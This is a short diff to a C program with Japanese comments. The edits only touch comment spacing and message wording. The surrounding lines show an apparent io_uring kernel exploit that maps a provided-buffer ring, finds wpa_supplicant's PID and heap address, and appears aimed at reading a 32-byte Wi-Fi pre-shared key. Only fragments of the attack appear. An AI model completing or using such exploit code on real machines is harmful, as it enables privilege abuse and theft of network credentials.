@@ -5,7 +5,7 @@
 #include <ctype.h>
 #include <liburing.h>
 
-/* PSK の長さ 256bit = 32byte*/
+/* PSK の長さ 256bit = 32byte */
 const int KEY_LENGTH = 32;
 
 /* dummy page */
@@ -59,7 +59,7 @@ int main() {
     // ユーザ空間にマップ
     void *pbuf_map = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, ring.ring_fd, IORING_OFF_PBUF_RING);
     if (pbuf_map == MAP_FAILED) {
-        err_exit("[-] mmap() failed");
+        err_exit("[-] failed to map ring buffer to user space");
     }
     printf("[+] pbuf mapped at %p\n", pbuf_map);
 
@@ -126,7 +126,7 @@ int main() {
 
     // wpa_supplicant のプロセスID取得
     int pid = get_process_id();
-    printf("[+] pid = %d\n", pid);
+    printf("[+] PID of wpa_supplicant: %d\n", pid);
 
     // wpa_supplicant プロセスの heap 領域のアドレスを取得
     uint64_t heap_addr = get_heap_start_address(pid);
